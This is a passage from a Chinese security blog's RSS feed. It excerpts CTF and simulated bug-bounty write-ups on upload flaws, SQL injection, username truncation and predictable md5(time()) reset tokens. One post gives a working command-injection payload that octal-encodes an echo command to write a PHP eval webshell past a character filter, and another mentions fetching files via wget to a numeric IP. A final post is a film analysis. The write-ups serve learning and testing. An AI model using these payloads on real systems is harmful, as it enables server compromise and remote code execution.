$mCTF_Cookie = md5($user.</description>
    </item>
    <item>
      <title>Pwnhub 公开赛 Web writeup</title>
      <link>http://d0n9.github.io/posts/af427e51-faac-45a8-96df-b6d9790d0d61/</link>
      <pubDate>Thu, 08 Dec 2016 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/af427e51-faac-45a8-96df-b6d9790d0d61/</guid>
      <description>前面 Pwnhub.cn 是老司机们经常开车的地方，新司机想学开车就更得多多关注了(/捂脸逃)。
戳这里关注官微：胖哈勃
因为是内测，司机要取得&amp;quot;通行证&amp;quot;(邀请码)才能上路，那么作为公开赛，其实就是拿 Flag 换邀请码啦。
两个方向，Web 和 binary，作为一只🐶，不要挣扎就选 Web 吧。
（了解到 Web 题是长亭 CSO 人称 V总的 Valo 在一次实战中遇到的， binary 题则是今年1024 GeekPwn 上破解 PS4 主力进攻选手所出）
过程 线上比赛地址：http://54.223.145.113:88/
做题没截图，大家意会好了。
看到是一个上传页面，难道要考上传拿 Shell ？诶？上传的文件内容会回显到页面中，会不会是 system(cat) 的，拼接一下命令，哦不是。可能是file_get_contents() 读取的，会不会有 SSRF，先看看可以控制的两个位置，文件名和文件内容，拼接一下文件名，后缀得是 txt 结尾，domain.com/1.txt绕过就好，但是 cloudeye 并没有反应。虽然文件内容会原样显示到页面，能造成 XSS 漏洞，但也只是 Self-XSS ，貌似没什么卵用。
陷入僵局，那试一下会不会有源代码泄露啥的，毕竟也是 CTF 常见套路，.bak、.swp、.php~、.svn、.git 等都试了一遍无果，扫目录吧😭，啪啪啪，一通扫发现 /upload/ 是HTTP 403，证明目录存在呀，也难怪，本身就是上传文件嘛，诶，目录如果403的话，那里面的文件不会也403吧，尝试访问一下**/1**，是 HTTP 404，那就知道了 Apache Directory 设置的是 var/www/html/upload 但知道这点也没有用呐，甚至还不知道 Flag 在哪。
* 先放一放，接着搬砖
然后晚上回家看到官微放出 hint ，还叫自行寻找，躲猫猫什么的最喜欢了😳，右键查看源代码，html注释中有 upload.php 关键代码。
&amp;lt;!-- @move_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;], $dir.$name); echo &amp;#34;上传成功！\n\n文件内容：\n\n&amp;#34;; echo file_get_contents($dir.</description>
    </item>
    <item>
      <title>模拟众测漏洞 writeup</title>
      <link>http://d0n9.github.io/posts/160e0ef9-2d53-4342-894d-d2b756facd36/</link>
      <pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/160e0ef9-2d53-4342-894d-d2b756facd36/</guid>
      <description>write-up 已经告诉 flag 位置，那么朝着这么目标渗透吧。
一开始是一个后台登录界面，想要模拟的环境是后台对外开放并且可被注册，在众测中也经常遇到这类漏洞，比如员工系统或者协同办公系统，注册登录后在内部的 wiki 中发现一些敏感信息。 登录处有预留一个SQL注入，想考的是任意账号登录，所以在代码中限制了长度，SQLMAP 默认没有尝试or注入，好像跑不出来，这个位置的注入还算隐秘，主要看渗透者细不细心，如果不细心怎么办？没关系呀~ 拿出打 CTF 的套路，页面中的一切都有可能是tips，就好像玩密室逃脱，慢慢找线索。 //唉，别打我
一般隐藏提示的地方常见于 html 或者 http header 中，很少有人注意到图片吧，诶厉害了，顺便还能涉及到隐写术，越来越像 CTF 了啊喂。 很明显这不是一张普通的萌妹子图片，binwalk 告诉我们这张图片经过 ps 处理之后又捆绑了一个charles201610201126.zip文件， 压缩包中是 charles 的保存文件，修改后缀为har然后用 charles 打开， 当然这里想考的是注册 admin 的姿势，代码是这样写的
if (strlen($user) &amp;gt; 5) { echo &amp;#34;&amp;lt;p&amp;gt;waring：注意帐号长度不超过5位&amp;lt;/p&amp;gt;&amp;#34;; } elseif ($user == &amp;#39;admin&amp;#39;) { exit(&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;admin已被注册&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;); } 之前在微博放出的 tips 有提到这点，代码和数据库差异性导致的问题，这类问题虽然比较少见，记得最早好像在道哥的《白帽子讲 Web 安全》中看到过，user 字段长度设定为5，但没有在代码中对传入的 user 值进行长度限制，以至于可以注册一个用户名为admin1的账号，写入数据库时由于长度限制会自动截断丢弃，这样实际上还是注册了admin 然后接下来注册流程会向邮箱发送激活账号链接，需要 user 和 token 值对应才行，这里模拟的是众测中很常见的密码找回案例， token看似是一组没有规律的字符串，其实是伪随机，有经验的同学可能会尝试破解这串 md5 观察是基于什么加密的。 很明显是time()函数的一次 md5，很容易就能预测任何时间的token 值，这里有个小知识，观察 POST 的时间一般向后几秒就是正确的 token，但要注意，time()函数获取的时间戳是会和本地时间相差八小时，因为从php5.1.0开始，php.ini里加入了date.timezone这个选项，默认情况下是关闭的，也就是显示的时间（无论用什么php命令）都是格林威治标准时间 和我们的时间（北京时间）差了正好8个小时。 进入到 admin 管理员账号，看到只有一个上传图片的功能（懒，没有写其他功能），看到有上传，大家惯性思维都会先测有没有任意文件上传的漏洞，不过仔细看上传的文件会被重命名，这里代码是这样写的，这样除非有解析漏洞或者文件包含。这里也是最坑的地方，很多同学到这里就没了思路。</description>
    </item>
    <item>
      <title>Linux 下的命令注入</title>
      <link>http://d0n9.github.io/posts/ed6611cf-81ce-4463-95ca-ed3e54bbbcbd/</link>
      <pubDate>Tue, 20 Sep 2016 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/ed6611cf-81ce-4463-95ca-ed3e54bbbcbd/</guid>
      <description>Linux 下的命令注入 之前发在微博上的一道题，首先投稿到了三哥的公众号然后发在了微博上，建立了这个 Blog 之后搬运过来。
目标是Linux系统的命令注入，要求必须用echo命令写Webshell，但不能出现e、c、h、o这四个字符，cat、tee、wget、curl、less、more 这些带有关键字的都不行
核心点是必须用echo，而且不能出现关键字，这样使用@zTrix 在阿里安全峰会演讲中的技巧就不行了，而且写PHP Webshell 的话，也是需要用到 h 的（echo &amp;lsquo;&amp;rsquo; &amp;raquo; index.* 也可以这样写，但要开启短标签）
所以第一想到的是通过编码，base64肯定是不行的，那如果是八进制呢？ (十六进制也行哦，但可能会包含E和C)
八进制数的基数是8，采用0，1，2，3，4，5，6，7 八个数字。 十六进制数的基数是16，采用的数码是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F。 八进制里面不会包含关键字，先尝试一下编码echo命令，然后使用printf进行解码
bingo，成功把echo拿出来，那么接下来就很简单了吧，把整条写Webshell语句拿出来然后用**$()**执行
echo &amp;#34;&amp;lt;?php @eval($_POST[&amp;#39;c&amp;#39;]);?&amp;gt;&amp;#34; &amp;gt; shell.php 转换为八进制是 \145\143\150\157\40\42\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76\42\40\76\40\163\150\145\154\154\56\160\150\160 $()这种写法是会优先执行括号里的内容，用来执行解码后的内容，然后图样图森破，echo的确被成功执行，但也把后面的内容全输出出来了，并没有写入。
很尴尬，不过换成这样写就行了，先构造出来echo语句，然后重定向符放到外面，再利用通配符写入
但在测试的时候，又会发现问题，“ * ” 并没有被当作通配符去解释
办法总是有的，完美的Payload如下
vul=;$(printf &amp;#34;\145\143\150\157\40\42\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76\42&amp;#34;)&amp;gt;&amp;gt;`ls t*.*` 使用上顿号执行一下，先构造出文件名
至此，不用e、c、h、o 这四个字符执行echo命令并写入Webshell 就搞定啦～
最后
实战中这种蛋疼环境不可能遇到，即使遇到不能执行echo命令，相信各位也会有一百种Getshell的方法，过滤 &amp;gt; `` &amp;quot;&amp;quot; \ $(). 等一系列特殊字符，还可以wget 2130706433（IP的数字地址）302跳转到ftp服务器自动下载，总之姿势有很多。</description>
    </item>
    <item>
      <title>电影解读 ·《不能说的秘密》</title>
      <link>http://d0n9.github.io/posts/b0825e8e-e876-48ab-88f7-a541e6edfced/</link>
      <pubDate>Sun, 18 Sep 2016 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/b0825e8e-e876-48ab-88f7-a541e6edfced/</guid>
      <description>写在前面 《不能说的秘密》是周董自导自演的一部电影，也是我个人最喜欢的一部爱情类电影，有一天闲逛知乎，看到这篇回答，作者每个细节都分析得很透彻，很多地方都有产生共鸣，对剧情的解读尤为厉害，经过作者同意对文章进行细节上的修改并转载到 Blog 中。
知乎原文 在影片的一开始，画面出现了一本古老的琴谱，配上宏大、谲诡的弦乐，透着一股神秘的劲。这部琴谱，就是穿越的源头，整个故事都因它而起。
开始了。
打这起，开始详解我之前说过的“这部电影没有多余的话”。
这里有几句看似闲聊的话，其实是在交代人物背景和埋下伏笔。
“我以前就听说过你了诶”“哦，真的吗。” “你是主修钢琴对吧？” “对啊”“为什么想来转来我们学校？你们学校不好吗”“因为你们学校比较漂亮啊。没有啦，我爸叫我来的”
开头的“我以前就听说”，接上后面的“主修钢琴”，其实意在衬托叶湘伦钢琴弹的很好，以致于“早就听说”。这是为后面斗琴的情节做铺垫，前面不指出他钢琴弹的好的话，后面“斗琴”就显得太突兀了。如果拍个奖状奖杯什么的又显得太俗。简单的一句“我以前就听说过你”，显得自然不露痕迹，这是上档次的表现手法。至于他爸为什么要他转来，后面也给了合理的解释，因为他爸是这学校的老师嘛，自然想看着儿子在自己眼底下毕业。
“好漂亮哦”“这栋琴房已经有100年的历史了”
“一百年啦”（强调100年）“恩，不过在我们毕业典礼的那一天就要拆掉了。”
这里又给出了一个线索：这栋琴房在毕业典礼那天就要拆掉了。理由是已经“有100年的历史”，要盖新的。 强调是在毕业典礼的“那一天”，因为这句话，才有后面女主回到1999年，去见男主一面的情节。才有结尾叶湘伦冒险去弹琴的高潮。
男主鬼使神差地独自进入了琴房大楼。注意听后面隐隐约约的音乐，路小雨刚刚来到1999。这里从叶湘伦进门到和路小雨相遇足足给了一分钟的镜头，也就是拍了一分钟叶湘伦在走廊的情景。这里其实是在说，接下来要见的，是个很重要的人哦。
叶湘伦和路小雨的first sight
（first sight 强调一下，路小雨穿越回来后第一眼看见谁，那个人才能看到她。）
上课了。
这里有一点好玩的地方，黑板左下角的值日生是 方文山 和 黄俊郎。。
路小雨进教室。（由于first sight的缘故，此时别人都看不到她）
老师在提醒叶湘伦不要往后看。
这个镜头很厉害，虚化了晴依，将焦点对在路小雨身上，让人不易察觉她俩都在笑。
别人是看不到路小雨的，所以老师和同学觉得叶湘伦是在看晴依，所以晴依才得意地偷笑。这个镜头非常用心，因为只有看第二遍以上才知道这个笑的意思。
为了突出两人的笑是这个意思，还拍进了前面一个女生，她因为知道叶湘伦肯定不是看自己，一点也没笑。
“这是一个不能说的秘密 ” 叶湘伦在问她那首曲子的名字，她没有回答他，又回答了他，那首曲子确实叫《Secret》。
这部电影中的对白，充斥着大量的双关，只有在你什么都明白了之后，才会理解其中的深意。
回家了。
（买菜回家）
之前看到的时候一直在纳闷这个情节想要表达什么，好像没什么意义嘛。仔细想想才明白，在整部电影中，叶湘伦一直在极力避免两样东西。物质和性。整部电影里没有出现过金钱，性暗示之类的东西。或许周董觉得这两样东西会使爱情不那么美好吧。
回到学校了。
黄秋生在教导学生。
路小雨笑了一下。
叶湘伦又马上要走。
路小雨看到教训学生为什么要笑？聊着好好的叶湘伦为什么要走？
原来路小雨笑是因为看到20年后的黄秋生感到有趣，而叶湘伦要走是因为黄秋生是他爸，不想让老爸看见自己和女同学在一起。 这些也是在看第二遍的时候，才能体会到这两句的深意。
黄秋生也是很重要的角色，在这里就把人物铺垫出来了。
去散步。
“我都没吃过”，这句话是路小雨说的。这句话暗示路小雨不是1999年的人，这个不难理解，但是难得的“导演叶湘伦”能想到1979年那个时候没有锥形冰淇淋。
在台湾，锥形冰淇淋的出现是在20世纪80年代后期，并且在台湾冰淇淋市场占有率过半的cold stone和杜老爷都是在1988年先后成立的。所以这一句话出现的很严谨。是有过生活体验或者考史的。而且即使路小雨那个时期已经有了冰淇淋，也不构成硬伤，可以理解成她不爱吃零食。
不行，越想越觉得厉害了。
另外在后面还有这样的对话
也是在暗示小雨的身份。与身边的人格格不入的生活习惯。（抱歉，这段真截不到路小雨好看的图。。）
精彩的斗琴桥段
这段有人和《海上钢琴师》比较，认为是抄袭。其实两者同为斗琴，本质是有区别的。《海》是一台钢琴，你上完了我来；这里是两台。《海》是一开始眼看要输，最后绝地反击的节奏；这里是步步压制。《海》是没有两人合作的戏份的，这有。 不能说只要钢琴比赛的片段，都是抄袭吧？
斗琴的这段，可以听出叶湘伦的音乐功力真的很厉害，可以编的这么好听，前后节奏也掌握的很棒。这一段非常之棒，甚至一度让我萌生了学钢琴的念头
上视频：不能说的秘密 斗琴精彩片段
四手联弹
很浪漫的情节，也是我最喜欢的桥段之一。但是我想光夸不行，得说说缺点。这一段据桂纶镁说“前前后后拍了70多次”，这70多次怎么剪辑，是非常考验剪辑能力的。这里还是出现了一处破绽。
注意看白袖子：
这是连贯的画面，不往下拽的话，外层的衣服是不会盖住里面的袖子吧。这是剪辑的一处痕迹。但令人惊讶的是，其余地方例如发型，摆设，却看不出破绽。说明叶湘伦确实当时在意过这点，而世上没有完美的事，拼接总会有点破绽的。
叶湘伦来到路小雨家里。
这里用了不显眼的镜头，出现了一个中年女人。
这个看似一闪而过的镜头很重要，在这里的铺垫是很难发觉的，哪怕再回过头看几遍也很可能看不到她。</description>
    </item>
  </channel>
</rss>
